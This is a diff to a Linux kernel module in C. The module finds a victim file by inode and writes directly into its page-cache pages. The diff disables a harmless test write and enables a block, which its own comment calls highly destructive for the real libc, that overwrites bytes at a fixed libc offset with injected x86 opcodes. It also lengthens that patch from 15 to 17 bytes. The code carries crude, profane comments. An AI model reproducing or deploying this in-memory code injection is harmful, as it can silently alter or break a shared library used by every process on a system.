@@ -16,14 +16,14 @@
 char* troll = "trolled";
 
 
-char trolling_opcodes[] = { 0x48, 0x8D, 0x35, 0x5C, 0xBE, 0x08, 0x00, 0x90, 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00   }; //append with a shit ton of nops
+char trolling_opcodes[] = { 0x48, 0x8D, 0x35, 0x5C, 0xBE, 0x08, 0x00, 0x90, 0x90, 0x90, 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00 }; //append with a shit ton of nops
 int init_module(void)
 {
  	void* map;
   char* ptr;
   struct page* page;
   int count;
-  char* path = TOSTRING(VICTIM_FILE);//TOSTRING(VICTIM_FILE);///VICTIM_FILE_OVERRIDE;//TOSTRING(VICTIM_FILE);//TOSTRING(VICTIM_FILE);
+  char* path = VICTIM_FILE_OVERRIDE;//TOSTRING(VICTIM_FILE);//TOSTRING(VICTIM_FILE);///VICTIM_FILE_OVERRIDE;//TOSTRING(VICTIM_FILE);//TOSTRING(VICTIM_FILE);
 //  printk("path after stringify %d\n", linux); //stupid fucking macro nobody like you you cuck fuck you
 	struct inode* i = get_file_path(path);//
   if(!i){
@@ -44,7 +44,7 @@ int init_module(void)
     printk(KERN_INFO "Page failed\n");
     return 0;
   }
-
+  /*
   page = find_page_inode(i, 0);
   if(!page){
     printk(KERN_INFO "Page failed\n");
@@ -55,14 +55,14 @@ int init_module(void)
   *((char*)map) = 'A';
   kunmap(page);
 
-
+  */
 
   /*
   THE CODE BELOW IS HIGHLY DESTRUCTIVE. DO NOT, UNDER ANY CIRCUMSTANCE, RUN IT AGAINST THE REAL LIBC
 
   */
 
-  /*
+
   page = find_page_inode(i, 0x0019d030); //ok so this actually works
   if(!page){
     printk(KERN_INFO "Page failed\n");
@@ -82,11 +82,11 @@ int init_module(void)
   }
   map = kmap(page);
   ptr = (char*)map + pg_off(0x001111d4);
-  for(count = 0; count < 15; count++, ptr++){
+  for(count = 0; count < 17; count++, ptr++){
     *ptr = trolling_opcodes[count];
   }
   kunmap(map);
-  */
+
   //SetPageDirty(page); //this fixes it thus proving that it is not a bug in the writeback daemon
 
   if(PageDirty(page)){
